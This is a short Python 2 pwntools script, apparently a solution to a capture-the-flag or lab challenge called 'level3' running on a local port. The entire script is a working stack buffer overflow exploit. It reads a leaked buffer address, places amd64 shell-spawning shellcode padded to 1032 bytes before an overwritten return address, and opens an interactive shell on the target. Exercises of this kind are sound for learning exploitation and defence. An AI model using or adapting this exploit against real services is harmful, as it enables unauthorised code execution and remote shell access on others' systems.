#!/usr/bin/env python2
from pwn import *
context.arch = "amd64"

elf = ELF("./level3")

def loc():
    return process("./level3")

def rem():
    return remote("127.0.0.1", 10003)

r = rem()
address = r.recvline().replace("Buffer address: ", "")
address = int(address, 16)
shellcode = asm(shellcraft.sh())
payload = shellcode.ljust(1032, "A") + p64(address)

r.recv(1024)
r.send(payload)
r.interactive()